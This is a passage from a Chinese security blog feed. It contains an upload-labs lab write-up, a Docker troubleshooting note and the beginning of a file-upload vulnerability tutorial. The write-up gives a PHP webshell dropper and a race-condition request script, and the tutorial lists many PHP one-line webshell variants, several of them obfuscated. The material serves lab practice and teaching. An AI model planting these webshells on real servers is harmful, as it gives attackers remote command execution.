src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231125145629243.png" alt="image-20231125145629243"></p><p>成功上传，尝试连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231125145736113.png" alt="image-20231125145736113"></p><h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><p><strong>0x01</strong></p><p>根据提示，发现了文件包含漏洞</p><p>但是这个需要3种后后缀名都需要上传成功</p><p>注意上传图片马，不是将php后缀改成图片后缀文件</p><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p><strong>0x01</strong></p><p>上传图片马，然后连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231125153013784.png" alt="image-20231125153013784"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231125153023178.png" alt="image-20231125153023178"></p><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>同理上传图片马</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/image-20231125155347138.png" alt="image-20231125155347138"></p><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p><strong>0x01</strong></p><p>这个地方有点坑，小心gif的非法字符</p><p><strong>0x02</strong></p><p>然后和之前的差不多了，直接上传后连接就行了</p><h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><h2 id="JPG-1"><a href="#JPG-1" class="headerlink" title="JPG"></a>JPG</h2><p>这道题的解决方法和上一道题的解决方法是一样的</p><h2 id="PNG-1"><a href="#PNG-1" class="headerlink" title="PNG"></a>PNG</h2><p><strong>0x01</strong></p><p>直接使用图片马</p><p><strong>0x02</strong></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/image-20231125191600052.png" alt="image-20231125191600052"></p><h2 id="GIF-1"><a href="#GIF-1" class="headerlink" title="GIF"></a>GIF</h2><p>同理，就不重复解释了</p><h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><p>还是一道图片马的题</p><h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><h2 id="GIF-2"><a href="#GIF-2" class="headerlink" title="GIF"></a>GIF</h2><p>我这里直接上传gif之后就成功了，但是网上还有二次渲染啥的</p><p>下面是我使用的图片</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/dvwa/1.gif" alt="1"></p><h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><p>这个到体做起来就比较有压力了</p><p><strong>0x01</strong></p><p>这个是运用了竞争条件，简单的来说就是我们运行了将要删除的php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123; <span class="hljs-comment">//这个是真实上传到服务器上面</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于会比较后面删除php文件所以我们可以尝试一直访问连接，知道访问成功</p><p>下面的php文件用于上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;Tony.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&#x27;</span>&lt;?php @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;value&quot;</span>])<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;);?&gt;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>下面是用于创建访问的python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># from re import L</span><br><span class="hljs-keyword">from</span> matplotlib.pyplot <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> arange<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, Lock<br><span class="hljs-keyword">import</span> sys<br><br><br>flag=<span class="hljs-literal">False</span><br><br>lock=Lock()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">url</span>):<br>    lock.acquire()<br>    <span class="hljs-keyword">global</span> flag<br>    lock.release()<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> flag:<br>        r = requests.get(url)<br>        <span class="hljs-comment"># print(r.status_code)</span><br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br>            <span class="hljs-built_in">print</span>(i)<br>            lock.acquire()<br>            flag=<span class="hljs-literal">True</span><br>            lock.release()<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> &lt;url&gt;&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        t = Thread(target=send_request, args=(sys.argv[<span class="hljs-number">1</span>],))<br>        t.start()<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>但是我一直没有访问成功</p><p><strong>0x02</strong></p><p>在写完上面的文章之后，我仔细回想了一下问题，能上传upload.php，也能访问到，那么就是upload.php的问题</p><p>下面是upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;getshell.php&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;value&quot;])?&gt;&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>为什么之前的那个不正常。那就请读到这篇文章的同学仔细想想，看看</p><p>为了简化，我也将python脚本进行了删减</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> L<br><span class="hljs-keyword">from</span> matplotlib.pyplot <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> arange<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, Lock<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># flag=False</span><br><br><span class="hljs-comment"># lock=Lock()</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># lock.acquire()</span><br>    <span class="hljs-comment"># global flag</span><br>    <span class="hljs-comment"># lock.release()</span><br>    <span class="hljs-comment"># i=0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = requests.get(url)<br>        <span class="hljs-comment"># print(r.status_code)</span><br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>            <span class="hljs-comment"># print(i)</span><br>            <span class="hljs-comment"># lock.acquire()</span><br>            <span class="hljs-comment"># flag=True</span><br>            <span class="hljs-comment"># lock.release()</span><br><br>send_request(<span class="hljs-string">&quot;http://192.168.157.166/uploadlabs/upload/upload.php&quot;</span>)<br><br><br><br><span class="hljs-comment"># def main():</span><br><span class="hljs-comment">#     if len(sys.argv) != 2:</span><br><span class="hljs-comment">#         print(f&quot;Usage: &#123;sys.argv[0]&#125; &lt;url&gt;&quot;)</span><br><span class="hljs-comment">#         sys.exit(1)</span><br><span class="hljs-comment">#     for _ in range(4):</span><br><span class="hljs-comment">#         t = Thread(target=send_request, args=(sys.argv[1],))</span><br><span class="hljs-comment">#         t.start()</span><br><span class="hljs-comment">#         t.join()</span><br><br><span class="hljs-comment"># if __name__ == &quot;__main__&quot;:</span><br><span class="hljs-comment">#     main()</span><br></code></pre></td></tr></table></figure><p>然后就能上传成功了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231127100004214.png" alt="image-20231127100004214"></p><h1 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h1><p>这道题好像有点问题</p><h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><p><strong>0x01</strong></p><p>这个道题没有对上传的文件做限制，但是需要对修改的名字做限制了</p><p>这道题的话，可以理解为使用后缀名绕过</p><p><strong>0x02</strong></p><p>直接使用修改为php文件是不给过的</p><p>使用大小写绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231127103501092.png" alt="image-20231127103501092"></p><p>能上传，尝试链接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/upload_labs/image-20231127103535410.png" alt="image-20231127103535410"></p><p>发现不能上传</p><p>看一下upload文件夹里面的东西是什么情况</p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker容器创建成功无法访问</title>
    <link href="/2023/11/22/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/docker%E5%AE%B9%E5%99%A8%E5%88%9B%E5%BB%BA%E6%88%90%E5%8A%9F%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE/"/>
    <url>/2023/11/22/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/docker%E5%AE%B9%E5%99%A8%E5%88%9B%E5%BB%BA%E6%88%90%E5%8A%9F%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>虚拟机ubuntu使用docker 搭建upload-labs发现本机，与主机都不能访问</p><h1 id="经历流程"><a href="#经历流程" class="headerlink" title="经历流程"></a>经历流程</h1><p>正常搭建upload-labs的流程</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/clip_image002.jpg" alt="img"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/clip_image004.jpg" alt="img"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/clip_image006.jpg" alt="屏幕上有字  描述已自动生成"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/clip_image008.jpg" alt="图形用户界面, 文本  描述已自动生成"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/clip_image010.jpg" alt="img"></p><h1 id="尝试解决"><a href="#尝试解决" class="headerlink" title="尝试解决"></a>尝试解决</h1><h2 id="端口映射问题"><a href="#端口映射问题" class="headerlink" title="端口映射问题"></a>端口映射问题</h2><p>发现端口映射没有问题</p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>重新启动docker服务 </p><p>我使用的是ubuntu</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl restart docker<br></code></pre></td></tr></table></figure><p>然后需要重新启动一下容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker start id<br></code></pre></td></tr></table></figure><h1 id="使用的参考文献"><a href="#使用的参考文献" class="headerlink" title="使用的参考文献"></a>使用的参考文献</h1><p><a href="https://blog.csdn.net/weixin_45533131/article/details/132592570">docker容器运行成功但无法访问，原因分析及对应解决方案（最新，以Tomcat为例，亲测有效）_docker打不开_smilehjl的博客-CSDN博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>技术随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>er图</title>
    <link href="/2023/11/20/MYSQL/er%E5%9B%BE/"/>
    <url>/2023/11/20/MYSQL/er%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>MYSQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/11/19/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/11/19/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h1><p>由于程序员没有对文件上传后做审查导致用户可以按照自己的想法上传可执行文件，这个就是文件上传漏洞。</p><h1 id="什么是Webshell"><a href="#什么是Webshell" class="headerlink" title="什么是Webshell"></a>什么是Webshell</h1><ol><li>就是一种以asp[^asp]，php，jsp，cgi等网页文件形式存在的一种命令执行环境</li><li>攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录</li></ol><h1 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h1><p>可以理解为连接菜刀，蚁剑的钥匙</p><p>下面是常用的一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>(cmd));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个cmd就是我们需要的钥匙</p><h2 id="常用的一句话木马"><a href="#常用的一句话木马" class="headerlink" title="常用的一句话木马"></a>常用的一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">##PHP：</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;r00ts&#x27;</span>]);<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//?cmd=phpinfo() @preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abcd&quot;); ?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?cmd=phpinfo();</span><br><span class="hljs-variable">$func</span> =<span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-variable">$func</span>();<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//?func=system&amp;cmd=whoami</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-variable">$new_array</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-comment">//print_r($new_array);</span><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?cmd=phpinfo()</span><br>@<span class="hljs-title function_ invoke__">call_user_func</span>(assert,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?cmd=phpinfo()</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//?func=system&amp;cmd=whoami</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array1</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$func</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$array1</span>,<span class="hljs-variable">$func</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$_GET</span>,<span class="hljs-string">&#x27;asse&#x27;</span>.<span class="hljs-string">&#x27;rt&#x27;</span>);<span class="hljs-meta">?&gt;</span> php环境&gt;=&lt;<span class="hljs-number">5.6</span>才能用<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">usort</span>(...<span class="hljs-variable">$_GET</span>);<span class="hljs-meta">?&gt;</span>  php环境&gt;=<span class="hljs-number">5.6</span>才能用<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST1</span>);<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);&#125;<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_REQUEST1</span>);<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> (<span class="hljs-variable">$_</span>=@<span class="hljs-variable">$_GET1</span>).@<span class="hljs-variable">$_</span>(<span class="hljs-variable">$_POST1</span>)<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">eval_r</span>(<span class="hljs-variable">$_POST1</span>)<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">eval_r</span>(<span class="hljs-variable">$_POST1</span>)<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//容错代码 </span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST1</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </span><br><span class="hljs-meta">&lt;?</span><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cc&#x27;</span>]);<span class="hljs-meta">?&gt;</span> <br><span 